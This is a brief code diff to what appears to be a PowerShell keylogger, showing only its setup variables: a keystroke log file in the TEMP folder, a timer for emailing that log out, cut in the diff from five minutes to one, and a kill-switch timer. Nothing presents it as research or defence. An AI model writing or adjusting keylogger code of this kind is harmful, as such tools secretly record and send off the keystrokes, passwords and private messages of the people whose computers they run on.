@@ -1,6 +1,6 @@
 # Define variables for email, timing configuration, and kill switch timer
 $logFile = "$env:TEMP\keylog.txt"
-$emailIntervalMinutes = 5  # How often to email the log in minutes (adjustable)
+$emailIntervalMinutes = 1  # How often to email the log in minutes (adjustable)
 $killSwitchTimeMinutes = 2  # Time in minutes after which the keylogger will stop (adjustable)
 $killSwitchTriggered = $false  # Flag to track if kill switch has been triggered
 
